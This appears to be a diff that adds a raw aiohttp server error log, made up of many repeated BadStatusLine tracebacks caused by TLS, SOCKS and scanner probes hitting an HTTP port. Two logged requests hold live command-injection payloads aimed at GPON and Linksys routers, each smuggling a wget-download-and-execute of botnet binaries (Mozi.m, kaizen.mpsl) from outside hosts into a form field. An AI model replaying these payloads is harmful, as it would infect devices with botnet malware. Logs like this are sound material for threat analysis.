@@ -1,0 +1,3670 @@
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01$\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x10'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x10'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01D\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.152.159.191:51892/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0'
+                                                                                                                            ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01\x01\xbbh\x10\xb9\xf1'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+kaizen.mpsl%3B+wget+http%3A%2F%2F176.65.149.168%2Fbins%2Fkaizen.mpsl%3B+chmod+777+kaizen.mpsl%3B+.%2Fkaizen.mpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1'
+                                                                                                                                                                                                                                     ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\xa6\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\xa6\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01W\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01I\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x9a\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x02\x01\x9b\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xa8\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x9e\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\xb5\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x02b\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
